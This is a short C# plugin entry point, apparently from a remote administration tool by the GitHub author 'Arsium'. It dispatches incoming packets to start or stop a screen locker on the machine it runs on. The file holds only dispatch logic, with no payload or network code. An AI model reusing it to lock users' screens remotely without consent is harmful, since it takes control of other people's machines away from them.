using PacketLib;
using PacketLib.Packet;
using PacketLib.Utils;

/* 
|| AUTHOR Arsium ||
|| github : https://github.com/arsium       ||
*/

namespace Plugin
{
    public static class Launch
    {
        public static void Main(LoadingAPI loadingAPI)
        {
            switch (loadingAPI.CurrentPacket.PacketType)
            {
                case PacketType.MISC_SCREENLOCKER_ON:
                    Helpers.StartScreenLocker();
                    break;

                case PacketType.MISC_SCREENLOCKER_OFF:
                    Helpers.StopScreenLocker();
                    break;

                default:
                    return;
            }
            Miscellaneous.CleanMemory();
        }
    }
}
